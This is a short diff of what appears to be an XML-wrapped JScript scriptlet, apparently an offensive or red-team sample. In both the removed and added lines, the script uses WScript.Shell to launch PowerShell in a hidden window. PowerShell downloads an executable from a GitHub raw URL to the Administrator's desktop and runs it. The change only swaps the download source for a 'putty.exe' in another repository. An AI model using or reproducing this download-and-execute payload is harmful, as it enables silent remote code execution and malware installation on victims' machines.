@@ -11,7 +11,7 @@
 	<script language="JScript">
 		<![CDATA[
 	
-			new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/leezp/TEST/master/one','c:\\Users\\Administrator\\Desktop\\a.exe');start-process 'c:\\Users\\Administrator\\Desktop\\a.exe'",0,true);
+			new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\Users\\Administrator\\Desktop\\a.exe');start-process 'c:\\Users\\Administrator\\Desktop\\a.exe'",0,true);
 	
 		]]>
 </script>
